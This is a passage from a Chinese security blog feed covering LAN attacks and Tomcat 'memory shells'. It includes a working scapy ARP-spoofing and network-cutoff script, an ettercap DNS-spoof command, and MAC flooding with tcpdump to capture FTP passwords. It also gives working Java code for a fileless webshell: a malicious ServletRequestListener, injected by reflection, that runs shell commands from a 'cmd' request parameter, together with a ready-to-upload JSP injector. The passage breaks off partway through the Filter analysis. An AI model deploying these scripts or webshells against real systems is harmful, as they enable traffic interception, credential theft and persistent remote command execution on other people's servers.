src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144946.png" alt="QQ截图20210219144946"><br>然后我们执行arpspoog指令<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145018.png" alt="QQ截图20210219145018"><br>此时我们物理机就能连上外网了<br><em>坑点:开启ip转发后物理机依旧不能连上外网.</em> 我的解决方法是重启一下，再修改以下ip_forward文件然后等一会，物理机就可以连上外网了.arp欺骗后物理机网可能会卡。<br>此时，物理机发给网关的通信信息我们都能获得到了，我们可以在虚拟机中使用driftnet工具捕获物理机正在浏览的图片<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145032.png" alt="QQ截图20210219145032"></p><h2 id="arp攻击的脚本编写："><a href="#arp攻击的脚本编写：" class="headerlink" title="arp攻击的脚本编写："></a>arp攻击的脚本编写：</h2><p>arp攻击脚本需要用到scapy库来帮助我们完成arp数据包的编写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">讲讲里面的一些函数(没有继续研究scapy库)</span><br><span class="line">get_if_hwaddr(&#39;网卡名&#39;)  &#x2F;&#x2F;获得自己的mac地址，一般填WLAN或eth0</span><br><span class="line">getmacbyip(&#39;ip)         &#x2F;&#x2F;获得某IP的mac地址</span><br><span class="line">srp(....)               &#x2F;&#x2F;发第二层包并返等待回应，返回值的第一个参数是回应包体。第二个参数是未回应包体</span><br><span class="line"></span><br><span class="line">sendp(Ether(src&#x3D;a,dst&#x3D;b)&#x2F;ARP(hwsrc&#x3D;c,psrc&#x3D;d,pdst&#x3D;e,op&#x3D;f))</span><br><span class="line">&#x2F;&#x2F;这是arp发包的构造 sendp是发第二层数据包并不等待回包 Ether是构造包体的意思</span><br><span class="line">&#x2F;&#x2F;a为自己的mac地址 b为目标机器的mac地址，</span><br><span class="line">&#x2F;&#x2F;c为发包的来源mac，d为发包的来源ip，e是目标机器的ip，f是arp操作类型字符</span><br><span class="line">&#x2F;&#x2F;arp欺骗的话，把d改成网关IP即可</span><br></pre></td></tr></table></figure><p>网上嫖的ip，mac扫描模块，这一步也可以手动获取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">#im_scan(&#39;192.168.1.1&#x2F;24&#39;),mac ip地址扫描函数</span><br><span class="line">def im_scan(ipduan):</span><br><span class="line">    ipscan&#x3D;ipduan</span><br><span class="line">    try:</span><br><span class="line">        ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print (str(e))</span><br><span class="line">    else:</span><br><span class="line">        for snd,rcv in ans:</span><br><span class="line">            list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)</span><br><span class="line">            print (list_mac)</span><br></pre></td></tr></table></figure><p>这个脚本仅能断网嗷,可以对单个机器断网，也可以断整个局域网的网</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def im_scan(ipduan):#扫描</span><br><span class="line">    ipscan&#x3D;ipduan</span><br><span class="line">    try:</span><br><span class="line">        ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print (str(e))</span><br><span class="line">    else:</span><br><span class="line">        for snd,rcv in ans:</span><br><span class="line">            list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)</span><br><span class="line">            print (list_mac)</span><br><span class="line">            </span><br><span class="line">def arp_spoof(tgt_ip,gateway_ip,iface):</span><br><span class="line">    mmac&#x3D;get_if_hwaddr(iface)</span><br><span class="line">    tgt_mac&#x3D;getmacbyip(tgt_ip)</span><br><span class="line">    if tgt_ip:</span><br><span class="line">        while 1:</span><br><span class="line">            sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,pdst&#x3D;tgt_ip,op&#x3D;2))</span><br><span class="line">    else:</span><br><span class="line">        while 1:</span><br><span class="line">            sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,op&#x3D;2))</span><br><span class="line"></span><br><span class="line">def arp_gate(tgt_ip,gateway_ip,iface):</span><br><span class="line">    mmac&#x3D;get_if_hwaddr(iface)</span><br><span class="line">    tgt_mac&#x3D;getmacbyip(tgt_ip)</span><br><span class="line">    while 1:</span><br><span class="line">        sendp(Ether(dst&#x3D;gateway_mac,src&#x3D;mmac)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;tgt_ip,pdst&#x3D;gateway_ip,op&#x3D;2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    ipduan&#x3D;&#39;192.168.0.0&#x2F;24&#39;</span><br><span class="line">    tgt_ip&#x3D;&#39;192.168.0.104&#39; #要打整个局域网就别设置这个，要截获外界发往机器的数据这个也必须设置</span><br><span class="line">    gateway_ip&#x3D;&#39;192.168.0.1&#39;</span><br><span class="line">    iface&#x3D;&#39;WLAN&#39;</span><br><span class="line">    threads_num&#x3D;20</span><br><span class="line">    print(&quot;如果想搞整个局域网就别设置tgt_ip,要截获外界发往机器的数据这个必须设置&quot;)</span><br><span class="line">    so_scan&#x3D;input(&quot;[+]要扫描局域网存活主机和它的mac吗[Y&#x2F;N]&quot;)</span><br><span class="line">    if so_scan&#x3D;&#x3D;&#39;Y&#39;:</span><br><span class="line">        im_scan(ipduan)</span><br><span class="line">    else:</span><br><span class="line">        so_judge&#x3D;input(&quot;[+]你是想让机器的发送的数据被你截获Y，还是外界发送给机器的数据被你截获N[Y&#x2F;N]&quot;)</span><br><span class="line">        if so_judge&#x3D;&#x3D;&#39;Y&#39;:</span><br><span class="line">            try:</span><br><span class="line">                print(&#39;开始截胡机器发送往外界的数据&#39;)</span><br><span class="line">                time.sleep(3)</span><br><span class="line">                for i in range(threads_num):</span><br><span class="line">                    t1&#x3D;threading.Thread(target&#x3D;arp_spoof,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i))</span><br><span class="line">                    t1.start()</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                print(&#39;[+]stopppppppp&#39;)</span><br><span class="line">        else:</span><br><span class="line">            if tgt_ip:</span><br><span class="line">                try:</span><br><span class="line">                    print(&#39;开始截胡外界发往机器的数据&#39;)</span><br><span class="line">                    time.sleep(3)</span><br><span class="line">                    for i in range(threads_num):</span><br><span class="line">                        t2&#x3D;threading.Thread(target&#x3D;arp_gate,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i))</span><br><span class="line">                        t2.start()</span><br><span class="line">                except KeyboardInterrupt:</span><br><span class="line">                    print(&#39;[+]stopppppppp&#39;)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;请设置tgt_ip&#39;)</span><br></pre></td></tr></table></figure><p>广播欺骗，受害机上的抓包效果 3c那个是我的mac地址<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145053.png" alt="QQ截图20210219145053"></p><h1 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h1><h2 id="dns工作原理"><a href="#dns工作原理" class="headerlink" title="dns工作原理"></a>dns工作原理</h2><p>dns（域名系统）将域名和IP地址相互映射，dns协议即域名解析协议，用来将用户输入的域名解析为IP。<br>具体一点，当用户访问某个域名如<a href="http://www.baidu.com/">www.baidu.com</a>时， 首先向本地dns发出请求<br>若本地dns缓存表无该域名IP映射关系，就会向根域名服务器发起查询，根域名服务器返回com域服务器地址给本地dns服务器<br>本地dns服务器向com域服务器发起查询，com域服务器返回baidu.com域服务器给本地dns服务器<br>本地dns服务器向baidu.com域服务器发起查询，baidu.com域服务器返回<a href="http://www.baidu.com/">www.baidu.com</a>地址</p><h2 id="DNS欺骗原理"><a href="#DNS欺骗原理" class="headerlink" title="DNS欺骗原理"></a>DNS欺骗原理</h2><p>在arp欺骗后获取到了受害机发起的dns请求包，然后返回一个自己构造的dns响应包，伪造自己想要的ip域名映射关系。<br>因为DNS欺骗是建立在arp欺骗基础上，arp欺骗又必须在局域网进行，故DNS欺骗也只能在局域网进行</p><h2 id="DNS欺骗工具实现"><a href="#DNS欺骗工具实现" class="headerlink" title="DNS欺骗工具实现"></a>DNS欺骗工具实现</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145146.png" alt="QQ截图20210219145146"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ettercap -T -q -P dns_spoof -M arp:remote &#x2F;受害者IP&#x2F;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145220.png" alt="QQ截图20210219145220"></p><h1 id="mac泛洪攻击"><a href="#mac泛洪攻击" class="headerlink" title="mac泛洪攻击"></a>mac泛洪攻击</h1><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机:"></a>交换机:</h2><p>交换机，只能做有线链接，所以拿这个是不能用作wifi的。<br>交换机的作用是转发局域网内两台机器之间的互相的请求（有线连接的机器）。</p><p>交换机具体传输数据帧的过程：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">假设主机A第一次向主机B发送数据</span><br><span class="line">主机A向交换机发起一个源mac地址为自己，目标mac地址为主机B的数据帧</span><br><span class="line">交换机收到后，将源mac地址和其对应接口记录到mac地址表中（mac地址表与arp缓存表有区别）</span><br><span class="line">交换机在自己的mac地址表中检查是否有目标mac的信息，如果有则向目标mac接口转发数据帧，如果没有，就会向所以非数据来源接口的接口广播该数据帧（mac泛洪攻击原理）</span><br><span class="line">局域网内主机都收到了此数据帧，但只有主机B会响应该数据帧并且回应，回应信息里注明主机B的mac地址以便记录到mac地址表，其他主机都不会有反应。</span><br><span class="line">交换机接收到主机B的回应后，会记录其mac 接口的映射关系，以后AB通信时会调用mac地址表中的记录，实现单播</span><br></pre></td></tr></table></figure><h2 id="mac表与arp缓存表的区别"><a href="#mac表与arp缓存表的区别" class="headerlink" title="mac表与arp缓存表的区别"></a>mac表与arp缓存表的区别</h2><p>mac表记录在交换机中，用于记录接口 mac地址的对应关系<br>arp缓存表记录在本机中，用于记录IP mac地址的对应关系</p><h2 id="交换机mac表的学习机制："><a href="#交换机mac表的学习机制：" class="headerlink" title="交换机mac表的学习机制："></a>交换机mac表的学习机制：</h2><p>mac表一般都是有大小限制的，一旦mac表满了，其他mac地址就加不进来了。<br>一旦其他mac地址加不进来了，那么mac表就无法进一步学习，之后的所有请求都会被广播到局域网，实现泛洪。<br>mac表是有老化机制的，若交换机与某台主机长时间未通信，交换机就会把该主机的mac地址删除，等下一次通信时再学习。</p><h2 id="泛洪攻击原理："><a href="#泛洪攻击原理：" class="headerlink" title="泛洪攻击原理："></a>泛洪攻击原理：</h2><p>泛洪攻击的目的是获取主机之间的通信数据，要达到这个目的则需要强迫交换机把接收到的数据帧统统广播出来。泛洪攻击原理则是向交换机发送大量未知mac地址让交换机不停学习，把mac表充满，这样正常主机mac地址老化后就无法再添加到mac地址表中，以后的所有通信数据都会被广播出来</p><h2 id="使用kali上的macof来进行泛洪攻击"><a href="#使用kali上的macof来进行泛洪攻击" class="headerlink" title="使用kali上的macof来进行泛洪攻击"></a>使用kali上的macof来进行泛洪攻击</h2><p>目前有三台机器<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145424.png" alt="QQ截图20210219145424"><br>我们试着截获物理机登录ftp服务器时的账户与密码<br>先使用命令macof，让交换机的mac表被占满<br>仅输入macof即可<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145448.png" alt="QQ截图20210219145448"><br>输入tcpdump -nn -X -i eth0 tcp port 21开始抓包（建议不用wireshark，是因为同一时间macof命令发出的数据包太多了，用wireshark会巨卡）<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145510.png" alt="QQ截图20210219145510"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145527.png" alt="QQ截图20210219145527"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145527.png"></p><p>下面是抓http包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145603.png" alt="QQ截图20210219145603"></p><h2 id="mac泛洪攻击的局限性"><a href="#mac泛洪攻击的局限性" class="headerlink" title="mac泛洪攻击的局限性:"></a>mac泛洪攻击的局限性:</h2><p>只能在局域网内攻击另一个局域网内机器.<br>且攻击目标必须和自己用交换机有线连接起来<br>也就是说你的电脑发起mac泛洪是攻击不到你的手机的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;arp协议与欺骗&quot;&gt;&lt;a href=&quot;#arp协议与欺骗&quot; class=&quot;headerlink&quot; title=&quot;arp协议与欺骗&quot;&gt;&lt;/a&gt;arp协议与欺骗&lt;/h1&gt;&lt;h2 id=&quot;简单概要：&quot;&gt;&lt;a href=&quot;#简单概要：&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="内网渗透与权限维持" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>tomcat Listener，Filter内存马简要分析</title>
    <link href="http://const27.com/2021/06/28/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"/>
    <id>http://const27.com/2021/06/28/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/</id>
    <published>2021-06-28T13:51:11.051Z</published>
    <updated>2021-06-27T04:44:52.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tomcat内存马"><a href="#tomcat内存马" class="headerlink" title="tomcat内存马"></a>tomcat内存马</h1><h2 id="tomcat-容器"><a href="#tomcat-容器" class="headerlink" title="tomcat 容器"></a>tomcat 容器</h2><p>tomcat 主要包含四种容器：Engine，Host，Context，Wrapper。其对应关系如下图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210406203203615.png" alt="image-20210406203203615"></p><p>详细解读一下这个图。</p><p>一台服务器上是可以配置多个站点的，对于tomcat来说，每一个站点就对应一个HOST。</p><p>一个站点上是可以配置多个WEB应用的，比如说一个站点可能会有OA，SSO，邮件应用等等WEB应用，对于tomcat来说每一个WEB应用便对应着一个Context。</p><p>一个WEB应用中肯定也有多个访问路径，比如说OA可能就有登录，前端展示，搜索等。所以对于每一个访问路径tomcat都会分配一个Wrapper，每一个Wrapper对应一个Servlet，用于处理特定请求。</p><h2 id="Listener-内存马"><a href="#Listener-内存马" class="headerlink" title="Listener 内存马"></a>Listener 内存马</h2><p>tomcat收到请求时，处理顺序是 Listener-&gt;Filter-&gt;Servlet。<br>也就是说Listener是最先接触到数据请求的，我们可以在Listener上做手脚从而达到内存马的目的。</p><p>实际上，我们想实现一个内存马，思路便是想让tomcat执行一段恶意程序，把恶意的listener或者filter类写入tomcat内存中，由于tomcat处理请求时，请求会被listener和filter处理（也就是说会被我们的恶意类处理），因此达到隐蔽的木马功能。</p><p>具体怎么个实现呢？我们可以大致想象一个思路：获取服务器初步权限后，创建一个JSP并向内写入向内存注入恶意Listener或filter的代码，随后访问JSP触发JSP代码，恶意Listener或filter被注入内存，随后删除JSP，通过恶意Listener或filter实现无文件webshell。但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错，具体解决方法就是下文的内容了：</p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>如果我们想添加一个Listener，那么势必会用到一个方法：addListener。</p><p>我们来分析以下这个方法，想办法通过addListener方法把恶意Listener注入内存。<br>首先addListener方法是这么用的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();</span><br><span class="line">servletContext.addListener(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>我们直接跟进addListener，会发现跟进到了ServletContext这个接口类。</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20210626150246949.png" alt="image-20210626150246949"></p><p>那么实现addListener的类是什么呢？换句话说，servletContext这个实例化对象是如何被实例化的呢？</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626150652699.png" alt="image-20210626150652699"></p><p>通过调试，我们发现servletContext这个对象实际上是一个ApplicationContextFacade对象。<br>我们跟进到ApplicationContextFacade.class中，查看addListener方法的实现。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626151054515.png" alt="image-20210626151054515"></p><p>发现实际上是调用了ApplicationContext类的addListener方法。再次跟进。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626153212402.png" alt="image-20210626153212402"></p><p>这里还调用了一个addListener，再次跟进。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154012832.png" alt="image-20210626154012832"></p><p>这里借用的别人的图，可以发现如果服务器已启动，那么通过直接调用addListener是无法添加监听器的。</p><p>究其原因，便是此处的context是StandardContext，它的状态是开始状态，无法在if判断中返回true。<br>这也就是上文提到的  “但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错”</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154229868.png" alt="image-20210626154229868"></p><p>如果能够突破if判断，来到此处，那么监听器就会被顺利的添加上</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626155428011.png" alt="image-20210626155428011"></p><h3 id="编写Listener内存马"><a href="#编写Listener内存马" class="headerlink" title="编写Listener内存马"></a>编写Listener内存马</h3><p>既然阻碍我们添加Listener的原因已经找到了，那么就应该考虑如何绕过这个限制了。<br>很简单，通过反射即可绕过这个限制。</p><p>在编写反射代码之前，我们有必要去看一下，我们怎样才能通过反射”够到”StandardContext的addApplicationEventListener方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626160137366.png" alt="image-20210626160137366"></p><p>可以直观的看到，我们可以通过servletContext获得它的context属性（ApplicationContext对象），然后通过ApplicationContext对象的context获得StandardContext对象，然后调用addApplicationEventListener方法。很好。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反射代码</span><br><span class="line">            ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();</span><br><span class="line">            Field field &#x3D; servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(servletContext);</span><br><span class="line">            field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">            standardContext.addApplicationEventListener(new MyListener(request,response)); &#x2F;&#x2F;这一行是将某个Listener类添加到监听器</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">恶意Listener</span><br><span class="line">public class MyListenr implements ServletRequestListener &#123;</span><br><span class="line"></span><br><span class="line">    public ServletResponse response;</span><br><span class="line">    public ServletRequest request;</span><br><span class="line"></span><br><span class="line">    MyListenr(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">        this.request &#x3D; request;</span><br><span class="line">        this.response &#x3D; response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        String cmder &#x3D; request.getParameter(&quot;cmd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process ps &#x3D; Runtime.getRuntime().exec(cmder);</span><br><span class="line">            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">            StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            String result &#x3D; sb.toString();</span><br><span class="line">            this.response.getWriter().write(result);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.out.println(&quot;error &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验一下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162713503.png" alt="image-20210626162713503"></p><p>我们先访问/a路由，让代码被执行。然后到任意页面传入恶意参数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162750746.png" alt="image-20210626162750746"></p><p>SUCCESS。</p><p>为了更方便的注入内存马，我从网上嫖了一个JSP（Linux版）。只要我们上传该JSP然后访问它一下，内存马就被注入了，十分的方便。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.jasper.tagplugins.jstl.core.Out&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;javax.servlet.annotation.WebServlet&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">     Object obj &#x3D; request.getServletContext();</span><br><span class="line">     Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">     field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">     ListenH listenH &#x3D; new ListenH(request, response);</span><br><span class="line">    standardContext.addApplicationEventListener(listenH);</span><br><span class="line">    out.print(&quot;test&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    public class ListenH implements ServletRequestListener &#123;</span><br><span class="line">        public ServletResponse response;</span><br><span class="line">        public ServletRequest request;</span><br><span class="line"></span><br><span class="line">        ListenH(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">            this.request &#x3D; request;</span><br><span class="line">            this.response &#x3D; response;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">            String cmder &#x3D; request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;;</span><br><span class="line">            try &#123;</span><br><span class="line">                Process ps &#x3D; Runtime.getRuntime().exec(cmd);</span><br><span class="line">                BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">                StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">                String line;</span><br><span class="line">                while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                    &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                    sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                String result &#x3D; sb.toString();</span><br><span class="line">                this.response.getWriter().write(result);</span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                System.out.println(&quot;error &quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="Filter-内存马"><a href="#Filter-内存马" class="headerlink" title="Filter 内存马"></a>Filter 内存马</h2><p>Filter内存马与Listener内存马还是有点区别的，要复杂一点点</p><h3 id="doFilter方法如何被执行？"><a href="#doFilter方法如何被执行？" class="headerlink" title="doFilter方法如何被执行？"></a>doFilter方法如何被执行？</h3><h4 id="配置filter"><a href="#配置filter" class="headerlink" title="配置filter"></a>配置filter</h4><p>再开始分析Filter内存马时，我们需要先知道，Filter类中的doFilter方法是如何被执行的。</p><p>OK我们先创建好一个Filter。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Filter类代码</span><br><span class="line">public class MyFilter implements ServletRequestListener &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Filter!&quot;);</span><br><span class="line">        chain.doFilter(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">    public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来在web.xml中添加Filter。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626193215688.png" alt="image-20210626193215688"></p><p>我们在doFilter方法处下断点，运行，得到调用帧如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204005990.png" alt="image-20210626204005990"></p><h4 id="filterchain"><a href="#filterchain" class="headerlink" title="filterchain"></a>filterchain</h4><p>我们从StandardWrapperValue#invoke 处开始分析.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure><p>那么这个filterChain是什么？我们跟进一下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204524626.png" alt="image-20210626204524626"></p><p>再度跟进到createFilterChain方法，来到了ApplicationFilterFactory.java里。</p><p>比较关键的代码是这里。这个方法会遍历FilterMaps，检测每个FilterMap项对应的那个Filter与请求的路由等是否一致。若一致则将以该filter的name为参数去FilterConfigs里去寻找对应的FilterConfig,然后将该filterconfig放入filterchain中。不一致的则抛弃。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204752458.png" alt="image-20210626204752458"></p><h4 id="filterconfig与filterdef"><a href="#filterconfig与filterdef" class="headerlink" title="filterconfig与filterdef"></a>filterconfig与filterdef</h4><p>那么filterconfig又是个什么样的东西呢？</p><p>我们跟进context.findFilterConfig,这里的context是StandardContext。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205344727.png" alt="image-20210626205344727"></p><p>再度跟进filterconfigs，就可以很明显的发现filterconfigs是一个hashmap结构 键为filter名，值为filterconfig<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205418654.png" alt="image-20210626205418654"></p><p>那么filterconfig的结构又是如何。我们跟进ApplicationFilterConfig类。下图是此类的构造函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205854332.png" alt="image-20210626205854332"></p><p>关键地方圈出来了是与filterdef有关的代码。在构造函数的时候将传入context和filterdef，然后再通过对filterdef调用getfilter获得filter类（即我们自己定义的filter类）。<br> 我们再看看filterDef的关键代码</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210144048.png" alt="image-20210626210144048"><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210116555.png" alt="image-20210626210116555"></p><p>OKOK，上面就是FilterConfig，FilterChain和FilterDef的一些零碎的介绍。<br>我们大致可以得到下列关键信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FilterConfigs 